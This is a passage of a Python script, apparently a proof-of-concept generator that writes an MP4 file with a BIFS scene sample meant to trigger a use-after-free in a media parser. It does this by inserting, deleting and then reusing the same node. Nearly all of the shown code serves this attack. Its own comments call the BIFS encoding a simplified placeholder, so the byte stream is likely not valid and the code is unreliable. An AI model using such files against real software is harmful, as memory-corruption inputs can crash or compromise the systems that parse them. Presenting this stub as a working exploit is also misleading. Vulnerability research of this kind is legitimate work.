 # entry_size[0]\n    return write_box(b\'stsz\', data)\n\ndef write_stco(offset):\n    """Chunk offset box"""\n    data = struct.pack(\'>I\', 0)  # version + flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', offset)  # chunk_offset[0]\n    return write_box(b\'stco\', data)\n\ndef write_bifs_sample():\n    """\n    Create a BIFS sample that triggers the UAF.\n    Strategy: Create commands that reference the same node multiple times,\n    causing it to be destroyed twice during cleanup.\n    \n    BIFS bitstream format is complex, so we\'ll create a minimal sample\n    that creates a scene with nodes that will be referenced multiple times.\n    """\n    # Simplified BIFS command stream\n    # This is a placeholder - real BIFS encoding is complex\n    # The key is to create a scene with commands that reference nodes\n    sample = bytearray()\n    \n    # BIFS command: Scene Replace (creates initial scene)\n    # Command tag for Scene Replace\n    sample.append(0x00)  # Simplified - real encoding is more complex\n    \n    # Create a Group node (TAG_MPEG4_Group = 24 in BIFS)\n    # Insert node command\n    sample.append(0x01)  # INSERT command\n    sample.append(0x18)  # Group node tag (simplified)\n    \n    # Create another command that references the same node\n    # This will cause the node to be stored in multiple command structures\n    sample.append(0x01)  # Another INSERT\n    sample.append(0x18)  # Reference to same node type\n    \n    # Delete command - this will free the node\n    sample.append(0x02)  # DELETE command\n    sample.append(0x00)  # Node reference\n    \n    # Another command that still holds a reference to the deleted node\n    # This causes the UAF when cleanup tries to destroy it again\n    sample.append(0x03)  # REPLACE command\n    sample.append(0x00)  # Reference to already-freed node\n    \n    return bytes(sample)\n\ndef generate_mp4():\n    """Generate complete MP4 file with BIFS scene"""\n    ou